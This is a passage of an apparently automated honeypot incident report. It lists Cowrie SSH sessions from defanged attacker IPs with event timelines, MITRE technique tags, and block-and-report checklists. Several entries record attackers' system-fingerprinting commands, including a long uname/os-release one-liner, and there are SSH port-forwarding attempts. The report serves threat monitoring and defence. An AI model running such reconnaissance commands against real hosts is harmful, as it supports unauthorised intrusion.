- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83147be941c9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:50 |
| **Last Seen** | 2026-07-23 17:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:50:06` | `cowrie.session.connect` |
| `2026-07-23 17:50:06` | `cowrie.client.version` |
| `2026-07-23 17:50:07` | `cowrie.client.kex` |
| `2026-07-23 17:50:07` | `cowrie.login.success` |
| `2026-07-23 17:50:08` | `cowrie.session.params` |
| `2026-07-23 17:50:08` | `cowrie.command.input` |
| `2026-07-23 17:50:08` | `cowrie.log.closed` |
| `2026-07-23 17:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34002cbd3625

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-23 17:51 |
| **Last Seen** | 2026-07-23 17:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:51:13` | `cowrie.session.connect` |
| `2026-07-23 17:51:13` | `cowrie.client.version` |
| `2026-07-23 17:51:13` | `cowrie.client.kex` |
| `2026-07-23 17:51:15` | `cowrie.login.success` |
| `2026-07-23 17:51:16` | `cowrie.session.params` |
| `2026-07-23 17:51:16` | `cowrie.command.input` |
| `2026-07-23 17:51:16` | `cowrie.command.input` |
| `2026-07-23 17:51:16` | `cowrie.command.input` |
| `2026-07-23 17:51:16` | `cowrie.command.input` |
| `2026-07-23 17:51:16` | `cowrie.command.input` |
| `2026-07-23 17:51:16` | `cowrie.command.success` |
| `2026-07-23 17:51:16` | `cowrie.command.input` |
| `2026-07-23 17:51:16` | `cowrie.command.input` |
| `2026-07-23 17:51:16` | `cowrie.command.input` |
| `2026-07-23 17:51:16` | `cowrie.command.input` |
| `2026-07-23 17:51:17` | `cowrie.log.closed` |
| `2026-07-23 17:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d95c6f8ae094

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:51 |
| **Last Seen** | 2026-07-23 17:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:51:45` | `cowrie.session.connect` |
| `2026-07-23 17:51:45` | `cowrie.client.version` |
| `2026-07-23 17:51:45` | `cowrie.client.kex` |
| `2026-07-23 17:51:45` | `cowrie.login.success` |
| `2026-07-23 17:51:46` | `cowrie.session.params` |
| `2026-07-23 17:51:46` | `cowrie.command.input` |
| `2026-07-23 17:51:46` | `cowrie.log.closed` |
| `2026-07-23 17:51:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edf74116d33e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:53 |
| **Last Seen** | 2026-07-23 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:53:22` | `cowrie.session.connect` |
| `2026-07-23 17:53:22` | `cowrie.client.version` |
| `2026-07-23 17:53:22` | `cowrie.client.kex` |
| `2026-07-23 17:53:22` | `cowrie.login.success` |
| `2026-07-23 17:53:23` | `cowrie.session.params` |
| `2026-07-23 17:53:23` | `cowrie.command.input` |
| `2026-07-23 17:53:23` | `cowrie.log.closed` |
| `2026-07-23 17:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-336be8052e1b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-23 17:53 |
| **Last Seen** | 2026-07-23 17:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:53:51` | `cowrie.session.connect` |
| `2026-07-23 17:53:51` | `cowrie.client.version` |
| `2026-07-23 17:53:51` | `cowrie.client.kex` |
| `2026-07-23 17:53:53` | `cowrie.login.success` |
| `2026-07-23 17:53:55` | `cowrie.session.params` |
| `2026-07-23 17:53:55` | `cowrie.command.input` |
| `2026-07-23 17:53:55` | `cowrie.command.input` |
| `2026-07-23 17:53:55` | `cowrie.command.input` |
| `2026-07-23 17:53:55` | `cowrie.command.input` |
| `2026-07-23 17:53:55` | `cowrie.command.input` |
| `2026-07-23 17:53:55` | `cowrie.command.success` |
| `2026-07-23 17:53:55` | `cowrie.command.input` |
| `2026-07-23 17:53:55` | `cowrie.command.input` |
| `2026-07-23 17:53:55` | `cowrie.command.input` |
| `2026-07-23 17:53:55` | `cowrie.command.input` |
| `2026-07-23 17:53:56` | `cowrie.log.closed` |
| `2026-07-23 17:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-281121784738

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:54 |
| **Last Seen** | 2026-07-23 17:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:54:59` | `cowrie.session.connect` |
| `2026-07-23 17:54:59` | `cowrie.client.version` |
| `2026-07-23 17:54:59` | `cowrie.client.kex` |
| `2026-07-23 17:54:59` | `cowrie.login.success` |
| `2026-07-23 17:55:00` | `cowrie.session.params` |
| `2026-07-23 17:55:00` | `cowrie.command.input` |
| `2026-07-23 17:55:00` | `cowrie.log.closed` |
| `2026-07-23 17:55:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7bc19e9cacb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-23 17:56 |
| **Last Seen** | 2026-07-23 17:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:56:25` | `cowrie.session.connect` |
| `2026-07-23 17:56:25` | `cowrie.client.version` |
| `2026-07-23 17:56:25` | `cowrie.client.kex` |
| `2026-07-23 17:56:28` | `cowrie.login.success` |
| `2026-07-23 17:56:29` | `cowrie.session.params` |
| `2026-07-23 17:56:29` | `cowrie.command.input` |
| `2026-07-23 17:56:29` | `cowrie.command.input` |
| `2026-07-23 17:56:29` | `cowrie.command.input` |
| `2026-07-23 17:56:29` | `cowrie.command.input` |
| `2026-07-23 17:56:29` | `cowrie.command.input` |
| `2026-07-23 17:56:29` | `cowrie.command.success` |
| `2026-07-23 17:56:29` | `cowrie.command.input` |
| `2026-07-23 17:56:29` | `cowrie.command.input` |
| `2026-07-23 17:56:29` | `cowrie.command.input` |
| `2026-07-23 17:56:29` | `cowrie.command.input` |
| `2026-07-23 17:56:29` | `cowrie.log.closed` |
| `2026-07-23 17:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa8e59d30ed7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:56 |
| **Last Seen** | 2026-07-23 17:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:56:39` | `cowrie.session.connect` |
| `2026-07-23 17:56:39` | `cowrie.client.version` |
| `2026-07-23 17:56:39` | `cowrie.client.kex` |
| `2026-07-23 17:56:40` | `cowrie.login.success` |
| `2026-07-23 17:56:42` | `cowrie.session.params` |
| `2026-07-23 17:56:42` | `cowrie.command.input` |
| `2026-07-23 17:56:42` | `cowrie.log.closed` |
| `2026-07-23 17:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70462ad72631

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-23 17:58 |
| **Last Seen** | 2026-07-23 17:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:58:59` | `cowrie.session.connect` |
| `2026-07-23 17:58:59` | `cowrie.client.version` |
| `2026-07-23 17:58:59` | `cowrie.client.kex` |
| `2026-07-23 17:59:02` | `cowrie.login.success` |
| `2026-07-23 17:59:05` | `cowrie.session.params` |
| `2026-07-23 17:59:05` | `cowrie.command.input` |
| `2026-07-23 17:59:05` | `cowrie.command.input` |
| `2026-07-23 17:59:05` | `cowrie.command.input` |
| `2026-07-23 17:59:05` | `cowrie.command.input` |
| `2026-07-23 17:59:05` | `cowrie.command.input` |
| `2026-07-23 17:59:05` | `cowrie.command.success` |
| `2026-07-23 17:59:05` | `cowrie.command.input` |
| `2026-07-23 17:59:05` | `cowrie.command.input` |
| `2026-07-23 17:59:05` | `cowrie.command.input` |
| `2026-07-23 17:59:05` | `cowrie.command.input` |
| `2026-07-23 17:59:05` | `cowrie.log.closed` |
| `2026-07-23 17:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8a2b0dbe5da

| Field | Detail |
|---|---|
| **Source IP** | `65.20.133[.]56` |
| **First Seen** | 2026-07-23 18:00 |
| **Last Seen** | 2026-07-23 18:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:00:27` | `cowrie.session.connect` |
| `2026-07-23 18:00:28` | `cowrie.client.version` |
| `2026-07-23 18:00:28` | `cowrie.client.kex` |
| `2026-07-23 18:00:29` | `cowrie.login.success` |
| `2026-07-23 18:00:30` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:00:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.133[.]56` to AbuseIPDB if not already reported
- [ ] Block `65.20.133[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb079d9869b1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-23 18:01 |
| **Last Seen** | 2026-07-23 18:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:01:30` | `cowrie.session.connect` |
| `2026-07-23 18:01:31` | `cowrie.client.version` |
| `2026-07-23 18:01:31` | `cowrie.client.kex` |
| `2026-07-23 18:01:33` | `cowrie.login.success` |
| `2026-07-23 18:01:34` | `cowrie.session.params` |
| `2026-07-23 18:01:34` | `cowrie.command.input` |
| `2026-07-23 18:01:34` | `cowrie.command.input` |
| `2026-07-23 18:01:34` | `cowrie.command.input` |
| `2026-07-23 18:01:34` | `cowrie.command.input` |
| `2026-07-23 18:01:34` | `cowrie.command.input` |
| `2026-07-23 18:01:34` | `cowrie.command.success` |
| `2026-07-23 18:01:34` | `cowrie.command.input` |
| `2026-07-23 18:01:34` | `cowrie.command.input` |
| `2026-07-23 18:01:34` | `cowrie.command.input` |
| `2026-07-23 18:01:34` | `cowrie.command.input` |
| `2026-07-23 18:01:35` | `cowrie.log.closed` |
| `2026-07-23 18:01:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf8a9cde7dab

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-07-23 18:03 |
| **Last Seen** | 2026-07-23 18:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:03:00` | `cowrie.session.connect` |
| `2026-07-23 18:03:01` | `cowrie.client.version` |
| `2026-07-23 18:03:01` | `cowrie.client.kex` |
| `2026-07-23 18:03:03` | `cowrie.login.success` |
| `2026-07-23 18:03:03` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:03:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e472365706c

| Field | Detail |
|---|---|
| **Source IP** | `58.56.128[.]190` |
| **First Seen** | 2026-07-23 18:03 |
| **Last Seen** | 2026-07-23 18:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:03:09` | `cowrie.session.connect` |
| `2026-07-23 18:03:09` | `cowrie.client.version` |
| `2026-07-23 18:03:09` | `cowrie.client.kex` |
| `2026-07-23 18:03:12` | `cowrie.login.success` |
| `2026-07-23 18:03:12` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.56.128[.]190` to AbuseIPDB if not already reported
- [ ] Block `58.56.128[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdf608602558

| Field | Detail |
|---|---|
| **Source IP** | `138.219.13[.]21` |
| **First Seen** | 2026-07-23 18:03 |
| **Last Seen** | 2026-07-23 18:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:03:42` | `cowrie.session.connect` |
| `2026-07-23 18:03:42` | `cowrie.client.version` |
| `2026-07-23 18:03:42` | `cowrie.client.kex` |
| `2026-07-23 18:03:43` | `cowrie.login.success` |
| `2026-07-23 18:03:44` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.219.13[.]21` to AbuseIPDB if not already reported
- [ ] Block `138.219.13[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e39eea822849

| Field | Detail |
|---|---|
| **Source IP** | `138.219.13[.]21` |
| **First Seen** | 2026-07-23 18:03 |
| **Last Seen** | 2026-07-23 18:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:03:53` | `cowrie.session.connect` |
| `2026-07-23 18:03:53` | `cowrie.client.version` |
| `2026-07-23 18:03:53` | `cowrie.client.kex` |
| `2026-07-23 18:03:54` | `cowrie.login.success` |
| `2026-07-23 18:03:55` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.219.13[.]21` to AbuseIPDB if not already reported
- [ ] Block `138.219.13[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9abcc2f60c49

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-23 18:06 |
| **Last Seen** | 2026-07-23 18:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:06:01` | `cowrie.session.connect` |
| `2026-07-23 18:06:01` | `cowrie.client.version` |
| `2026-07-23 18:06:01` | `cowrie.client.kex` |
| `2026-07-23 18:06:02` | `cowrie.login.success` |
| `2026-07-23 18:06:02` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:06:02` | `cowrie.direct-tcpip.data` |
| `2026-07-23 18:06:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15d0f825920e

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-07-23 18:08 |
| **Last Seen** | 2026-07-23 18:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:08:00` | `cowrie.session.connect` |
| `2026-07-23 18:08:01` | `cowrie.client.version` |
| `2026-07-23 18:08:01` | `cowrie.client.kex` |
| `2026-07-23 18:08:02` | `cowrie.login.success` |
| `2026-07-23 18:08:03` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8777f4426f8a

| Field | Detail |
|---|---|
| **Source IP** | `122.166.253[.]226` |
| **First Seen** | 2026-07-23 18:08 |
| **Last Seen** | 2026-07-23 18:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:08:12` | `cowrie.session.connect` |
| `2026-07-23 18:08:13` | `cowrie.client.version` |
| `2026-07-23 18:08:13` | `cowrie.client.kex` |
| `2026-07-23 18:08:15` | `cowrie.login.success` |
| `2026-07-23 18:08:16` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:08:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.253[.]226` to AbuseIPDB if not already reported
- [ ] Block `122.166.253[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-153d088d24b7

| Field | Detail |
|---|---|
| **Source IP** | `124.167.20[.]72` |
| **First Seen** | 2026-07-23 18:11 |
| **Last Seen** | 2026-07-23 18:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:11:25` | `cowrie.session.connect` |
| `2026-07-23 18:11:26` | `cowrie.client.version` |
| `2026-07-23 18:11:26` | `cowrie.client.kex` |
| `2026-07-23 18:11:28` | `cowrie.login.success` |
| `2026-07-23 18:11:29` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:11:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.167.20[.]72` to AbuseIPDB if not already reported
- [ ] Block `124.167.20[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08d4da405d4a

| Field | Detail |
|---|---|
| **Source IP** | `58.17.6[.]119` |
| **First Seen** | 2026-07-23 18:11 |
| **Last Seen** | 2026-07-23 18:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:11:36` | `cowrie.session.connect` |
| `2026-07-23 18:11:37` | `cowrie.client.version` |
| `2026-07-23 18:11:37` | `cowrie.client.kex` |
| `2026-07-23 18:11:40` | `cowrie.login.success` |
| `2026-07-23 18:11:42` | `cowrie.direct-tcpip.request` |
